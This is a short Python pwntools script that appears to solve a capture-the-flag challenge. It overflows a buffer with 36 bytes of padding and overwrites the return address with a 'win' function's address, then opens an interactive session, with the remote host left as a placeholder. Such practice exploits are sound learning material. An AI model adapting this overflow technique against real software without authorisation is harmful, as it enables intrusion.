#!/usr/bin/env python3
from pwn import *

elf = ELF('./chall')
local = True
GDBSCPT = '''
b* main
b* vuln+20

'''
OFFSET = 36
if local:
    conn = elf.process()
    gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = '##'
    port = 000
    conn = remote(host,port) 

conn.recvuntil(b'Whats your favorite fruit: ')
padding = b"A"*OFFSET
win_addr = elf.sym.win
log.info(f"win @: {hex(win_addr)}")

payload = flat(padding , win_addr)
conn.sendline(payload)
conn.interactive()


conn.close()